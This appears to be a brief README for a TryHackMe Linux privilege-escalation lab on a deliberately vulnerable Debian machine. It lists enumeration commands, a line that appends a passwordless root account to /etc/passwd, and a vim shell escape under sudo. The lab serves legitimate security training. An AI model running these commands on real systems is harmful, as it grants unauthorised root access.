# Linux Privilege Escalation - TryHackMe

## Overview

This project demonstrates multiple privilege escalation techniques on a vulnerable Debian machine.

## Tools Used

* Kali Linux
* SSH
* Linux commands

## Techniques Covered

* Weak File Permissions
* SUID Exploitation
* Sudo Misconfiguration
* Cron Jobs Exploitation
* Environment Variable Abuse
* Password & Key Discovery

## Enumeration Commands

```
whoami
id
uname -a
sudo -l
find / -perm -4000 2>/dev/null
```

## Exploitation Examples

### Writable /etc/passwd

```
echo 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd
```

### Sudo Exploit

```
sudo vim
:!bash
```

## Learning Outcome

* Learned privilege escalation techniques
* Understood Linux misconfigurations
* Practiced real-world attack scenarios

## Screenshots

(See /screenshots folder)
